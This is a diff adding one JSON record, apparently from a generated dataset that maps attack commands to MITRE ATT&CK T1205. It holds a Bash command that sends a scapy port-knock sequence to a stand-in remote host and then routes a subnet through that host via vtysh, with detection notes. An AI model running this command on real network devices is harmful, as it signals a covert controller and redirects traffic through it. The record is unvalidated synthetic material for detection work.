@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 -c \"from scapy.all import IP,TCP,send; dst=\\\"198.51.100.20\\\"; [send(IP(dst=dst)/TCP(dport=p,flags=\\\"S\\\"),verbose=False) for p in (10443,10444,10445)]\"; vtysh -c \"conf t\" -c \"ip route 10.77.0.0/16 198.51.100.20\"'",
+  "explanation": "Generates a TCP SYN-based port-knocking sequence (10443\u219210444\u219210445) to a remote controller, then inserts a static route via vtysh to exploit the opened service. Detection: watch for sequential SYNs to nonstandard ports and unusual post-knock route insertions.",
+  "rationale_steps": [
+    "Transmit a specific three-port TCP SYN sequence with scapy to act as the covert signal.",
+    "Assuming remote opens access, add a static route to steer traffic through that host.",
+    "Detect through NetFlow for patterned port sequences and audit FRR route table changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-e8b63af2",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
